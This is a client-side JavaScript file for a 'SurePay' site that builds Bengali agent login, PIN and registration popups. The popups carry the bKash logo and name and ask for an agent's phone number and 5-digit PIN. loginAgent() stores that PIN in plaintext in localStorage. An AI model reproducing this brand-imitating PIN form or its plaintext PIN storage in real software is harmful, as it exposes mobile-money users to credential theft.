// Agent Login Popup System for SurePay
// This script handles all the agent login and registration popups

// Global variables to track current and previous popups for navigation
let currentPopup = null;
let popupHistory = [];

// Create popup container if it doesn't exist
function ensurePopupContainer() {
  if (!document.getElementById("popup-container")) {
    const popupContainer = document.createElement("div");
    popupContainer.id = "popup-container";
    document.body.appendChild(popupContainer);
  }
  return document.getElementById("popup-container");
}

// Create and show the agent access popup (first popup)
function showAgentAccessPopup() {
  const popupContainer = ensurePopupContainer();

  // Clear existing content
  popupContainer.innerHTML = "";

  // Create popup
  const popup = document.createElement("div");
  popup.className = "popup-dialog agent-access-popup";
  popup.innerHTML = `
        <div class="popup-header">
            <h2>এজেন্ট অ্যাকসেস</h2>
            <button class="popup-close" onclick="closeAllPopups()">&times;</button>
        </div>
        <div class="popup-content">
            <p>বিকাশ এজেন্ট লগইন অথবা রেজিস্ট্রেশন করুন</p>
            <div class="agent-buttons">
                <button class="agent-button login-button" onclick="showAgentLoginPopup()">
                    A লগইন
                </button>
                <button class="agent-button register-button" onclick="showAgentRegistrationPopup()">
                    এজেন্ট রেজিস্ট্রেশন
                </button>
            </div>
        </div>
    `;

  popupContainer.appendChild(popup);

  // Show the popup container
  popupContainer.classList.add("show");

  // Add active class to popup after a short delay for animation
  setTimeout(() => {
    popup.classList.add("active");
  }, 10);

  // Track current popup
  currentPopup = "agent-access";
  popupHistory = ["agent-access"];

  // Add overlay to the body
  addOverlay();
}

// Show agent login popup
function showAgentLoginPopup() {
  const popupContainer = ensurePopupContainer();

  // Clear existing content
  popupContainer.innerHTML = "";

  // Create popup
  const popup = document.createElement("div");
  popup.className = "popup-dialog agent-login-popup";
  popup.innerHTML = `
        <div class="popup-header">
            <button class="popup-back" onclick="goBack()">&#8592;</button>
            <h2>এজেন্ট লগইন</h2>
            <button class="popup-close" onclick="closeAllPopups()">&times;</button>
        </div>
        <div class="popup-content">
            <div class="logo-container">
                <img src="/public/images/bkashlogo.png" alt="বিকাশ লোগো" class="popup-logo">
            </div>
            <div class="login-form">
                <div class="input-group">
                    <label for="agent-number">এজেন্ট নাম্বার *</label>
                    <div class="phone-input">
                        <div class="country-code">+88</div>
                        <input type="tel" id="agent-number" placeholder="01xxxxxxxxx" maxlength="11">
                    </div>
                    <p class="input-hint">১১ ডিজিটের বাংলাদেশি মোবাইল নাম্বার দিন</p>
                </div>
                <button class="submit-button" onclick="showAgentPinPopup()">
                    নাম্বার দিয়ে অগ্রসর হন
                </button>
            </div>
        </div>
    `;

  popupContainer.appendChild(popup);

  // Show the popup with animation
  setTimeout(() => {
    popup.classList.add("active");
  }, 10);

  // Track current popup
  currentPopup = "agent-login";
  popupHistory.push("agent-login");
}

// Show agent PIN popup
function showAgentPinPopup() {
  const popupContainer = ensurePopupContainer();

  // Validate phone number first
  const phoneInput = document.getElementById("agent-number");
  if (phoneInput && (!phoneInput.value || phoneInput.value.length < 11)) {
    // Highlight the input with error
    phoneInput.classList.add("error");
    // Show error message
    const errorMsg = document.createElement("p");
    errorMsg.className = "error-message";
    errorMsg.textContent = "সঠিক মোবাইল নাম্বার দিন";
    phoneInput.parentNode.appendChild(errorMsg);

    // Remove error after 3 seconds
    setTimeout(() => {
      phoneInput.classList.remove("error");
      if (errorMsg.parentNode) {
        errorMsg.parentNode.removeChild(errorMsg);
      }
    }, 3000);

    return;
  }

  // Clear existing content
  popupContainer.innerHTML = "";

  // Create popup
  const popup = document.createElement("div");
  popup.className = "popup-dialog agent-pin-popup";
  popup.innerHTML = `
        <div class="popup-header">
            <button class="popup-back" onclick="goBack()">&#8592;</button>
            <h2>এজেন্ট পিন</h2>
            <button class="popup-close" onclick="closeAllPopups()">&times;</button>
        </div>
        <div class="popup-content">
            <h3>আপনার এজেন্ট পিন দিন</h3>
            <p class="subtitle">আপনার ৫ সংখ্যার পিন দিন</p>
            
            <div class="security-notice">
                <div class="security-icon">
                    <i class="fas fa-shield-alt"></i>
                </div>
                <p>আপনার পিন একটি গোপনীয় নম্বর। এটি কখনও কারো সাথে শেয়ার করবেন না।</p>
            </div>
            
            <div class="pin-input-container">
                <input type="password" class="pin-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                <input type="password" class="pin-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                <input type="password" class="pin-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                <input type="password" class="pin-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                <input type="password" class="pin-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
            </div>
            
            <div class="show-pin">
                <input type="checkbox" id="show-pin-checkbox" onchange="togglePinVisibility()">
                <label for="show-pin-checkbox">পিন দেখুন</label>
            </div>
            
            <button class="submit-button" id="agent-login-button">
                লগইন করুন
            </button>
        </div>
    `;

  popupContainer.appendChild(popup);

  // Show the popup with animation
  setTimeout(() => {
    popup.classList.add("active");
  }, 10);

  // Add PIN input functionality
  setupPinInputs();

  // Add event listener to login button - IMPORTANT FIX
  document
    .getElementById("agent-login-button")
    .addEventListener("click", function (e) {
      e.preventDefault();
      loginAgent();
    });

  // Track current popup
  currentPopup = "agent-pin";
  popupHistory.push("agent-pin");
}

// Show agent registration popup
function showAgentRegistrationPopup() {
  const popupContainer = ensurePopupContainer();

  // Clear existing content
  popupContainer.innerHTML = "";

  // Create popup
  const popup = document.createElement("div");
  popup.className = "popup-dialog agent-registration-popup";
  popup.innerHTML = `
        <div class="popup-header">
            <button class="popup-back" onclick="goBack()">&#8592;</button>
            <h2>এজেন্ট রেজিস্ট্রেশন</h2>
            <button class="popup-close" onclick="closeAllPopups()">&times;</button>
        </div>
        <div class="popup-content">
            <form id="agent-registration-form">
                <div class="form-group">
                    <label for="agent-name">আপনার নাম *</label>
                    <input type="text" id="agent-name" class="form-control" placeholder="আপনার নাম" required>
                </div>
                
                <div class="form-group">
                    <label for="district">জেলা নির্বাচন করুন *</label>
                    <select id="district" class="form-control" required>
                        <option value="" disabled selected>জেলা নির্বাচন করুন</option>
                        <option value="dhaka">ঢাকা</option>
                        <option value="chittagong">চট্টগ্রাম</option>
                        <option value="sylhet">সিলেট</option>
                        <option value="rajshahi">রাজশাহী</option>
                        <option value="khulna">খুলনা</option>
                        <!-- Add more districts as needed -->
                    </select>
                </div>
                
                <div class="form-group">
                    <label for="upazila">উপজেলা নির্বাচন করুন *</label>
                    <select id="upazila" class="form-control" required>
                        <option value="" disabled selected>উপজেলা নির্বাচন করুন</option>
                        <!-- Options will be populated based on district selection -->
                    </select>
                </div>
                
                <div class="form-group">
                    <label for="father-name">বাবার/স্বামীর নাম দিন *</label>
                    <input type="text" id="father-name" class="form-control" placeholder="বাবার/স্বামীর নাম দিন" required>
                </div>
                
                <div class="form-group">
                    <label for="mobile-number">ফোন নম্বর *</label>
                    <input type="tel" id="mobile-number" class="form-control" placeholder="ফোন নম্বর দিন" maxlength="11" required>
                </div>
                
                <div class="form-group">
                    <label for="email">ইমেইল ঠিকানা</label>
                    <input type="email" id="email" class="form-control" placeholder="ইমেইল ঠিকানা দিন">
                </div>
                
                <div class="form-group">
                    <label for="dob">জন্মতারিখ বা NID জারি তারিখ দিন</label>
                    <input type="date" id="dob" class="form-control">
                </div>
                
                <div class="form-group form-checkbox">
                    <input type="checkbox" id="terms" required>
                    <label for="terms">আমি শর্তাবলী মেনে নিচ্ছি</label>
                </div>
                
                <button type="button" class="submit-button" onclick="showPinSetPopup()">
                    জমা দিন
                </button>
            </form>
        </div>
    `;

  popupContainer.appendChild(popup);

  // Show the popup with animation
  setTimeout(() => {
    popup.classList.add("active");
  }, 10);

  // Add district-upazila dependency
  setupDistrictUpazilaSelection();

  // Track current popup
  currentPopup = "agent-registration";
  popupHistory.push("agent-registration");
}

// Show PIN set popup
function showPinSetPopup() {
  // Validate the registration form
  const form = document.getElementById("agent-registration-form");
  if (form) {
    const requiredInputs = form.querySelectorAll("[required]");
    let isValid = true;

    requiredInputs.forEach((input) => {
      if (!input.value) {
        input.classList.add("error");
        isValid = false;

        // Add error message
        const errorMsg = document.createElement("p");
        errorMsg.className = "error-message";
        errorMsg.textContent = "এই ফিল্ডটি পূরণ করা আবশ্যক";
        input.parentNode.appendChild(errorMsg);

        // Remove error after 3 seconds
        setTimeout(() => {
          input.classList.remove("error");
          if (errorMsg.parentNode) {
            errorMsg.parentNode.removeChild(errorMsg);
          }
        }, 3000);
      }
    });

    if (!isValid) return;
  }

  const popupContainer = ensurePopupContainer();

  // Clear existing content
  popupContainer.innerHTML = "";

  // Create popup
  const popup = document.createElement("div");
  popup.className = "popup-dialog pin-set-popup";
  popup.innerHTML = `
        <div class="popup-header">
            <button class="popup-back" onclick="goBack()">&#8592;</button>
            <h2>পিন সেট করুন</h2>
            <button class="popup-close" onclick="closeAllPopups()">&times;</button>
        </div>
        <div class="popup-content">
            <p class="pin-instruction">৫ সংখ্যার একটি পিন সেট করুন যা আপনি মনে রাখতে পারবেন</p>
            
            <div class="security-notice">
                <div class="security-icon">
                    <i class="fas fa-shield-alt"></i>
                </div>
                <p>আপনার পিন একটি গোপনীয় নম্বর। এটি কখনও কারো সাথে শেয়ার করবেন না।</p>
            </div>
            
            <div class="pin-section">
                <label>পিন *</label>
                <div class="pin-input-container">
                    <input type="password" class="pin-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                    <input type="password" class="pin-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                    <input type="password" class="pin-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                    <input type="password" class="pin-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                    <input type="password" class="pin-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                </div>
            </div>
            
            <div class="pin-section">
                <label>পিন আবার লিখুন *</label>
                <div class="pin-input-container confirm-pin">
                    <input type="password" class="pin-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                    <input type="password" class="pin-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                    <input type="password" class="pin-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                    <input type="password" class="pin-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                    <input type="password" class="pin-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
                </div>
            </div>
            
            <div class="show-pin">
                <input type="checkbox" id="show-pin-checkbox" onchange="togglePinVisibility()">
                <label for="show-pin-checkbox">পিন দেখুন</label>
            </div>
            
            <p class="pin-note">এই পিন দিয়ে আপনি বিকাশ এজেন্ট প্যানেলে লগইন করতে পারবেন</p>
            
            <button class="submit-button" onclick="completeRegistration()">
                আপলোড করুন
            </button>
        </div>
    `;

  popupContainer.appendChild(popup);

  // Show the popup with animation
  setTimeout(() => {
    popup.classList.add("active");
  }, 10);

  // Add PIN input functionality
  setupPinInputs();

  // Track current popup
  currentPopup = "pin-set";
  popupHistory.push("pin-set");
}

// Utility Functions
// =================

// Setup PIN input behavior
function setupPinInputs() {
  const pinInputs = document.querySelectorAll(".pin-input");

  pinInputs.forEach((input, index) => {
    // Focus next input when a digit is entered
    input.addEventListener("input", function () {
      if (this.value.length === 1) {
        const nextInput = pinInputs[index + 1];
        if (nextInput) {
          nextInput.focus();
        }
      }
    });

    // Handle backspace to move to previous input
    input.addEventListener("keydown", function (e) {
      if (e.key === "Backspace" && this.value.length === 0) {
        const prevInput = pinInputs[index - 1];
        if (prevInput) {
          prevInput.focus();
        }
      }
    });

    // Handle paste event for PIN
    input.addEventListener("paste", function (e) {
      e.preventDefault();
      const pastedData = e.clipboardData.getData("text");
      if (/^\d+$/.test(pastedData)) {
        // Fill all inputs with pasted digits
        const digits = pastedData.split("");
        pinInputs.forEach((input, i) => {
          if (digits[i]) {
            input.value = digits[i];
          }
        });

        // Focus the last filled input or the next empty one
        const lastIndex = Math.min(pinInputs.length - 1, digits.length);
        pinInputs[lastIndex].focus();
      }
    });
  });

  // Focus the first PIN input
  if (pinInputs.length > 0) {
    pinInputs[0].focus();
  }
}

// Toggle PIN visibility
function togglePinVisibility() {
  const checkbox = document.getElementById("show-pin-checkbox");
  const pinInputs = document.querySelectorAll(".pin-input");

  if (checkbox && checkbox.checked) {
    pinInputs.forEach((input) => {
      input.type = "text";
    });
  } else {
    pinInputs.forEach((input) => {
      input.type = "password";
    });
  }
}

// Setup district-upazila dependency
function setupDistrictUpazilaSelection() {
  const districtSelect = document.getElementById("district");
  const upazilaSelect = document.getElementById("upazila");

  if (districtSelect && upazilaSelect) {
    const upazilasByDistrict = {
      dhaka: ["Dhaka City", "Savar", "Dhamrai", "Keraniganj", "Nawabganj"],
      chittagong: [
        "Chittagong City",
        "Patiya",
        "Sitakunda",
        "Mirsharai",
        "Hathazari",
      ],
      sylhet: [
        "Sylhet City",
        "Golapganj",
        "Beanibazar",
        "Fenchuganj",
        "Zakiganj",
      ],
      rajshahi: ["Rajshahi City", "Puthia", "Durgapur", "Bagmara", "Mohanpur"],
      khulna: ["Khulna City", "Dumuria", "Phultala", "Koyra", "Terokhada"],
    };

    districtSelect.addEventListener("change", function () {
      // Clear all options
      upazilaSelect.innerHTML =
        '<option value="" disabled selected>উপজেলা নির্বাচন করুন</option>';

      // Add new options based on selected district
      const district = this.value;
      if (district && upazilasByDistrict[district]) {
        upazilasByDistrict[district].forEach((upazila) => {
          const option = document.createElement("option");
          option.value = upazila.toLowerCase().replace(/\s/g, "_");
          option.textContent = upazila;
          upazilaSelect.appendChild(option);
        });
      }
    });
  }
}

// Create and add overlay to block background interaction
function addOverlay() {
  if (!document.getElementById("popup-overlay")) {
    const overlay = document.createElement("div");
    overlay.id = "popup-overlay";
    overlay.onclick = closeAllPopups;
    document.body.appendChild(overlay);

    // Make overlay visible after a short delay
    setTimeout(() => {
      overlay.classList.add("show");
    }, 10);
  }
}

// Remove overlay
function removeOverlay() {
  const overlay = document.getElementById("popup-overlay");
  if (overlay) {
    overlay.classList.remove("show");
    setTimeout(() => {
      if (overlay.parentNode) {
        overlay.parentNode.removeChild(overlay);
      }
    }, 300); // Match the transition duration
  }
}

// Close all popups
function closeAllPopups() {
  const popupContainer = document.getElementById("popup-container");
  if (popupContainer) {
    // Add closing animation
    const activePopup = popupContainer.querySelector(".popup-dialog.active");
    if (activePopup) {
      activePopup.classList.remove("active");

      // Wait for animation to complete before hiding container
      setTimeout(() => {
        popupContainer.classList.remove("show");
        popupContainer.innerHTML = "";
        currentPopup = null;
        popupHistory = [];
      }, 300); // Match the transition duration
    } else {
      popupContainer.classList.remove("show");
      popupContainer.innerHTML = "";
      currentPopup = null;
      popupHistory = [];
    }
  }

  // Remove overlay
  removeOverlay();
}

// Navigate back to previous popup
function goBack() {
  if (popupHistory.length > 1) {
    // Remove current popup from history
    popupHistory.pop();

    // Get the previous popup
    const previousPopup = popupHistory[popupHistory.length - 1];

    // Show the previous popup
    switch (previousPopup) {
      case "agent-access":
        showAgentAccessPopup();
        break;
      case "agent-login":
        showAgentLoginPopup();
        break;
      case "agent-registration":
        showAgentRegistrationPopup();
        break;
      default:
        closeAllPopups();
    }
  } else {
    // If no history, close all popups
    closeAllPopups();
  }
}

function loginAgent() {
  // Get all PIN inputs
  const pinInputs = document.querySelectorAll(".agent-pin-popup .pin-input");
  let pin = "";

  // Validate all PIN fields are filled
  let isValid = true;
  pinInputs.forEach((input) => {
    if (!input.value) {
      input.classList.add("error");
      isValid = false;
    } else {
      pin += input.value;
    }
  });

  if (!isValid) {
    // Show error message
    const errorMsg = document.createElement("p");
    errorMsg.className = "error-message pin-error";
    errorMsg.textContent = "সঠিক পিন দিন";
    const pinContainer = document.querySelector(
      ".agent-pin-popup .pin-input-container"
    );
    if (pinContainer && !document.querySelector(".pin-error")) {
      pinContainer.parentNode.insertBefore(errorMsg, pinContainer.nextSibling);
    }

    // Remove error after 3 seconds
    setTimeout(() => {
      pinInputs.forEach((input) => input.classList.remove("error"));
      if (errorMsg.parentNode) {
        errorMsg.parentNode.removeChild(errorMsg);
      }
    }, 3000);

    return;
  }

  // Create or update agent data in localStorage
  const agentNumber = localStorage.getItem("agentNumber") || "";
  const agentData = {
    agentNumber: agentNumber,
    pin: pin,
    isLoggedIn: true,
    registrationComplete: true,
  };

  // Store agent data
  localStorage.setItem("agentData", JSON.stringify(agentData));

  // Show success notification
  showNotification("এজেন্ট লগইন সফল হয়েছে");

  // Close popup before redirecting
  closeAllPopups();

  // Redirect to agent.html with delay
  setTimeout(() => {
    window.location.href = "agent.html";
  }, 1000);
}

function showNotification(message) {
  // Create notification element if it doesn't exist
  if (!document.getElementById("notification-container")) {
    const notificationContainer = document.createElement("div");
    notificationContainer.id = "notification-container";
    notificationContainer.style.position = "fixed";
    notificationContainer.style.top = "20px";
    notificationContainer.style.left = "50%";
    notificationContainer.style.transform = "translateX(-50%)";
    notificationContainer.style.zIndex = "10000";
    document.body.appendChild(notificationContainer);
  }

  const notification = document.createElement("div");
  notification.className = "notification";
  notification.textContent = message;

  // Style the notification
  notification.style.backgroundColor = "#23386a";
  notification.style.color = "white";
  notification.style.padding = "12px 20px";
  notification.style.borderRadius = "5px";
  notification.style.boxShadow = "0 3px 10px rgba(0, 0, 0, 0.2)";
  notification.style.marginBottom = "10px";
  notification.style.textAlign = "center";
  notification.style.minWidth = "250px";

  // Add to container
  document.getElementById("notification-container").appendChild(notification);

  // Remove after 3 seconds
  setTimeout(() => {
    if (notification.parentNode) {
      notification.parentNode.removeChild(notification);
    }
  }, 3000);
}

// Handle registration completion
function completeRegistration() {
  // Get all PIN fields in both sections
  const initialPinInputs = document.querySelectorAll(
    ".pin-set-popup .pin-input-container:not(.confirm-pin) .pin-input"
  );
  const confirmPinInputs = document.querySelectorAll(
    ".pin-set-popup .confirm-pin .pin-input"
  );

  let initialPin = "";
  let confirmPin = "";

  // Validate all initial PIN fields are filled
  let initialPinValid = true;
  initialPinInputs.forEach((input) => {
    if (!input.value) {
      input.classList.add("error");
      initialPinValid = false;
    } else {
      initialPin += input.value;
    }
  });

  // Validate all confirm PIN fields are filled
  let confirmPinValid = true;
  confirmPinInputs.forEach((input) => {
    if (!input.value) {
      input.classList.add("error");
      confirmPinValid = false;
    } else {
      confirmPin += input.value;
    }
  });

  // Check if both sets are valid and match
  if (!initialPinValid || !confirmPinValid) {
    // Show error message
    const errorMsg = document.createElement("p");
    errorMsg.className = "error-message pin-error";
    errorMsg.textContent = "সব ফিল্ড পূরণ করুন";
    const pinContainer = document.querySelector(
      ".pin-set-popup .pin-input-container"
    );
    if (pinContainer && !document.querySelector(".pin-error")) {
      pinContainer.parentNode.insertBefore(errorMsg, pinContainer.nextSibling);
    }

    // Remove error after 3 seconds
    setTimeout(() => {
      document
        .querySelectorAll(".pin-set-popup .pin-input")
        .forEach((input) => input.classList.remove("error"));
      if (errorMsg.parentNode) {
        errorMsg.parentNode.removeChild(errorMsg);
      }
    }, 3000);

    return;
  }

  // Check if PINs match
  if (initialPin !== confirmPin) {
    // Show error message
    const errorMsg = document.createElement("p");
    errorMsg.className = "error-message pin-error";
    errorMsg.textContent = "পিন মিলছে না";
    const pinContainer = document.querySelector(".pin-set-popup .confirm-pin");
    if (pinContainer && !document.querySelector(".pin-error")) {
      pinContainer.parentNode.insertBefore(errorMsg, pinContainer.nextSibling);
    }

    // Remove error after 3 seconds
    setTimeout(() => {
      confirmPinInputs.forEach((input) => {
        input.classList.remove("error");
        input.value = "";
      });
      if (errorMsg.parentNode) {
        errorMsg.parentNode.removeChild(errorMsg);
      }
    }, 3000);

    return;
  }

  // For demo, show success message and redirect to agent login
  // First show a success message
  const popup = document.querySelector(".pin-set-popup");
  if (popup) {
    const successMessage = document.createElement("div");
    successMessage.className = "success-message";
    successMessage.innerHTML = `
            <div class="success-icon">
                <i class="fas fa-check-circle"></i>
            </div>
            <h3>রেজিস্ট্রেশন সফল হয়েছে!</h3>
            <p>আপনি এখন লগইন করতে পারেন</p>
        `;

    popup.querySelector(".popup-content").innerHTML = "";
    popup.querySelector(".popup-content").appendChild(successMessage);

    // Redirect to login page after delay
    setTimeout(() => {
      showAgentLoginPopup();
    }, 2000);
  }
}

// Initialize event handlers
function initAgentLoginSystem() {
  // Attach event listener to agent login button in navbar
  const agentButton = document.getElementById("agentButton");
  if (agentButton) {
    agentButton.addEventListener("click", function (e) {
      e.preventDefault();
      showAgentAccessPopup();
    });
  }

  // Make sure we don't override the regular login button's functionality
  const loginButton = document.getElementById("loginButton");
  if (loginButton) {
    // Make sure we don't interfere with any existing click handlers
    const existingClickHandler = loginButton.onclick;
    loginButton.onclick = null;

    loginButton.addEventListener("click", function (e) {
      e.preventDefault();
      // If there was an existing handler, call it
      if (typeof existingClickHandler === "function") {
        existingClickHandler.call(this, e);
      } else {
        // Fallback to the original function from the index.html
        if (typeof showPopup === "function") {
          showPopup("loginPopup");
        }
      }
    });
  }
}

// Run initialization when the DOM is fully loaded
document.addEventListener("DOMContentLoaded", initAgentLoginSystem);
